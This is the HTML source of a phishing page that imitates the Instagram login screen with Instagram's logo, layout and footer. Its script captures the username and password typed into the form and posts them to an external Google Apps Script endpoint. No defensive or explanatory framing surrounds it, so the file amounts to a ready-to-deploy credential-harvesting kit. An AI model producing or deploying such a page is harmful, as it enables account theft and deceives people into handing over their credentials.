<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; }
        .facebook-icon {
            width: 16px;
            height: 16px;
            display: inline-block;
            margin-right: 8px;
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png');
            background-repeat: no-repeat;
            background-position: -4px -4px;
            vertical-align: middle;
        }
    </style>
</head>
<body class="bg-gray-50">
    <main class="flex flex-col items-center justify-center min-h-screen py-12 px-4">
        <div class="w-full max-w-sm">
            <div class="bg-white border border-gray-300 rounded-sm p-10 text-center">
                <div class="mb-8 mt-4">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="h-14 mx-auto" />
                </div>
                <form id="loginForm">
                    <div class="space-y-2">
                        <input type="text" name="username" placeholder="Phone number, username, or email" class="w-full px-2 py-2 bg-gray-50 border border-gray-300 rounded-sm text-xs placeholder-gray-400 focus:outline-none focus:border-gray-400" required>
                        <input type="password" name="password" placeholder="Password" class="w-full px-2 py-2 bg-gray-50 border border-gray-300 rounded-sm text-xs placeholder-gray-400 focus:outline-none focus:border-gray-400" required>
                    </div>
                    <button id="submitButton" type="submit" class="w-full bg-blue-500 text-white font-semibold rounded-lg px-4 py-1.5 mt-4 hover:bg-blue-600 focus:outline-none disabled:opacity-50 text-sm">
                        Log in
                    </button>
                    <div id="formMessage" class="text-sm mt-3"></div>
                </form>
                <div class="flex items-center my-4">
                    <div class="flex-grow border-t border-gray-300"></div>
                    <span class="flex-shrink mx-4 text-xs font-semibold text-gray-500 uppercase">OR</span>
                    <div class="flex-grow border-t border-gray-300"></div>
                </div>
                <button class="w-full text-center font-semibold text-sm text-blue-900 mb-2">
                    <span class="facebook-icon"></span>
                    <span class="align-middle">Log in with Facebook</span>
                </button>
                <a href="#" class="text-xs text-blue-900 hover:underline mt-3 block">Forgot password?</a>
            </div>
            <div class="bg-white border border-gray-300 rounded-sm p-6 text-center mt-2.5">
                <p class="text-sm">Don't have an account? <a href="#" class="font-semibold text-blue-500 hover:underline">Sign up</a></p>
            </div>
            <div class="text-center mt-5">
                <p class="text-sm mb-4">Get the app.</p>
                <div class="flex justify-center space-x-2">
                    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" class="h-10"></a>
                    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft" class="h-10"></a>
                </div>
            </div>
        </div>
    </main>
    <footer class="text-center text-xs text-gray-500 py-10 px-4">
        <div class="flex justify-center flex-wrap gap-x-4 gap-y-2 mb-4">
            <a href="#" class="hover:underline">Meta</a>
            <a href="#" class="hover:underline">About</a>
            <a href="#" class="hover:underline">Blog</a>
            <a href="#" class="hover:underline">Jobs</a>
            <a href="#" class="hover:underline">Help</a>
            <a href="#" class="hover:underline">API</a>
            <a href="#" class="hover:underline">Privacy</a>
            <a href="#" class="hover:underline">Terms</a>
            <a href="#" class="hover:underline">Locations</a>
            <a href="#" class="hover:underline">Instagram Lite</a>
            <a href="#" class="hover:underline">Threads</a>
            <a href="#" class="hover:underline">Contact Uploading & Non-Users</a>
            <a href="#" class="hover:underline">Meta Verified</a>
        </div>
        <div class="flex justify-center items-center space-x-4">
            <span>English</span>
            <span>© 2024 Instagram from Meta</span>
        </div>
    </footer>
    <script>
        const form = document.getElementById('loginForm');
        const submitButton = document.getElementById('submitButton');
        const formMessage = document.getElementById('formMessage');
        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx_I9AU-beeaYPkXTFP7q8I28WarvizGFlyq_llxS2KEW9OHHrsalaoaxXqgc8jwRY/exec';
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            submitButton.disabled = true;
            submitButton.textContent = 'Logging in...';
            formMessage.textContent = '';
            formMessage.className = 'text-sm mt-3';
            const formData = new FormData(form);
            fetch(SCRIPT_URL, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.result === 'success') {
                    formMessage.textContent = 'Success! Login info submitted.';
                    formMessage.classList.add('text-green-600');
                    form.reset();
                } else {
                    throw new Error(data.message || 'An unknown error occurred.');
                }
            })
            .catch(error => {
                console.error('Error!', error);
                formMessage.textContent = 'Error: Could not submit data. Please try again.';
                formMessage.classList.add('text-red-600');
            })
            .finally(() => {
                submitButton.disabled = false;
                submitButton.textContent = 'Log in';
            });
        });
    </script>
</body>
</html>
